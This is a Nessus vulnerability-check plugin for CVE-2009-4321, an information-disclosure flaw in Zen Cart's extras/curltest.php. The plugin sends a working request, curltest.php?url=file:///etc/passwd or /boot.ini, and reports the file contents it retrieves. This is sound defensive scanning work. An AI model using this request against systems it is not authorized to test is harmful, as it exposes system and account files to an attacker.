#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43098);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/05/04 18:02:24 $");

  script_cve_id("CVE-2009-4321");
  script_bugtraq_id(37283);
  script_osvdb_id(60892);

  script_name(english:"Zen Cart extras/curltest.php Information Disclosure");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that can be abused to
disclose the contents of local files."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The installed version of Zen Cart includes a test script,
'extras/curltest.php', intended for testing that the curl PHP library is
installed and working properly.  It fails, though, to restrict access
and can be abused to access arbitrary URLs, including local files via
the 'file' protocol handler.

An anonymous remote attacker can abuse this issue to view the contents
of arbitrary files on the remote host, subject to the privileges under
which the web server operates, or to access arbitrary URLs, such as from
hosts on an internal network that might otherwise be unavailable to the
attacker."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/508340");
  script_set_attribute(attribute:"see_also", value:"http://www.zen-cart.com/forum/showthread.php?t=142784");
  script_set_attribute(attribute:"solution", value:"Remove the 'extras' directory from the affected install.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/12/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/11/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/12/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zen-cart:zen_cart");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("zencart_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/zencart");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP scripts.");


# Test an install.
install = get_install_from_kb(appname:'zencart', port:port);
if (isnull(install)) exit(0, "The 'www/"+port+"/zencart' KB item is missing.");
dir = install['dir'];


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through files to look for.
foreach file (files)
{
  url = dir + "/extras/curltest.php?" +
    "url=file://" + file;

  res = http_send_recv3(port:port, method:"GET", item:url);
  if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

  if (
    '[url] => "file://'+file+'"' >< res[2] &&
    egrep(pattern:file_pats[file], string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      report = '\n' +
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL :" + '\n' +
        '\n' +
        '  ' + build_url(port:port, qs:url) + '\n';

      if (report_verbosity > 1)
      {
        contents = res[2];
        if ('</pre><br /><br />' >< contents)
          contents = strstr(contents, '</pre><br /><br />') - '</pre><br /><br />';
        if ('\nEOF' >< contents) contents = contents - '\nEOF';

        report += '\n' +
          'Here are its contents :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          contents + '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }

      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
exit(0, "The Zen Cart install at "+build_url(port:port, qs:dir+"/")+" is not affected.");
